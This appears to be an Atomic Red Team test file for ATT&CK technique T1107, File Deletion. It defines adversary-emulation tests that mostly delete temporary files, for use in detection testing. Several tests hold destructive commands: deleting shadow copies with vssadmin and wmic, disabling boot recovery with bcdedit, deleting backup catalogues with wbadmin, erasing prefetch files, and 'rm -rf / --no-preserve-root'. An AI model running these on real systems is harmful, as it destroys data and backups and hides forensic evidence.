---
attack_technique: T1107
display_name: File Deletion

atomic_tests:
- name: Delete a single file - Linux/macOS
  description: |
    Delete a single file from the temporary directory
  supported_platforms:
    - linux
    - macos
  input_arguments:
    file_to_delete:
      description: Path of file to delete
      type: Path
      default: /tmp/victim-files/a
  executor:
    name: sh
    command: |
      rm -f #{file_to_delete}

- name: Delete an entire folder - Linux/macOS
  description: |
    Recursively delete the temporary directory and all files contained within it
  supported_platforms:
    - linux
    - macos
  input_arguments:
    folder_to_delete:
      description: Path of folder to delete
      type: Path
      default: /tmp/victim-files
  executor:
    name: sh
    command: |
      rm -rf #{folder_to_delete}

- name: Overwrite and delete a file with shred
  description: |
    Use the `shred` command to overwrite the temporary file and then delete it
  supported_platforms:
    - linux
  input_arguments:
    file_to_shred:
      description: Path of file to shred
      type: Path
      default: /tmp/victim-shred.txt
  executor:
    name: sh
    command: |
      shred -u #{file_to_shred}

- name: Delete a single file - Windows cmd
  description: |
    Delete a single file from the temporary directory using cmd.exe
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      echo "T1107" > %temp%\T1107.txt
      del /f  %temp%\T1107.txt

- name: Delete an entire folder - Windows cmd
  description: |
    Recursively delete the temporary directory and all files contained within it using cmd.exe
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      mkdir %temp%\T1107
      rmdir /s /q %temp%\T1107

- name: Delete a single file - Windows PowerShell
  description: |
    Delete a single file from the temporary directory using Powershell
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      New-Item $env:TEMP\T1107.txt
      Remove-Item -path $env:TEMP\T1107.txt

- name: Delete an entire folder - Windows PowerShell
  description: |
    Recursively delete the temporary directory and all files contained within it using Powershell
  supported_platforms:
    - windows
  input_arguments:
    folder_to_delete:
      description: Path of folder to delete
      type: Path
      default: C:\Windows\Temp\victim-files-ps
  executor:
    name: powershell
    elevation_required: false
    command: |
      New-Item $env:TEMP\T1107 -ItemType Directory
      Remove-Item -path $env:TEMP\T1107 -recurse

- name: Delete VSS - vssadmin
  description: |
    Delete all volume shadow copies with vssadmin.exe
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      vssadmin.exe Delete Shadows /All /Quiet

- name: Delete VSS - wmic
  description: |
    Delete all volume shadow copies with wmic
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      wmic shadowcopy delete

- name: bcdedit
  description: |
    This test leverages `bcdedit` to remove boot-time recovery measures.
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      bcdedit /set {default} bootstatuspolicy ignoreallfailures
      bcdedit /set {default} recoveryenabled no

- name: wbadmin
  description: |
    This test deletes Windows Backup catalogs.
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      wbadmin delete catalog -quiet

- name: Delete Filesystem - Linux
  description: |
    This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
  supported_platforms:
    - linux

  executor:
    name: bash
    command: |
      rm -rf / --no-preserve-root > /dev/null 2> /dev/null

- name: Delete-PrefetchFile
  description: |
    Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique.
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: true
    command: |
      Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])

- name: Delete TeamViewer Log Files
  description: |
    Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
    This test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer
    log file format of TeamViewerXX_Logfile.log
    https://twitter.com/SBousseaden/status/1197524463304290305?s=20
  supported_platforms:
    - windows
    - macos
  executor:
    name: powershell
    elevation_required: false
    command: |
      if ($env:os -eq "Windows_NT") {
        New-Item $env:TEMP\TeamViewer_54.log
      } else {
        New-Item $env:HOME\TeamViewer_54.log
      }
    cleanup_command: |
      if ($env:os -eq "Windows_NT") {
        Remove-Item $env:TEMP\TeamViewer_54.log
      } else {
        Remove-Item $env:HOME\TeamViewer_54.log
      }
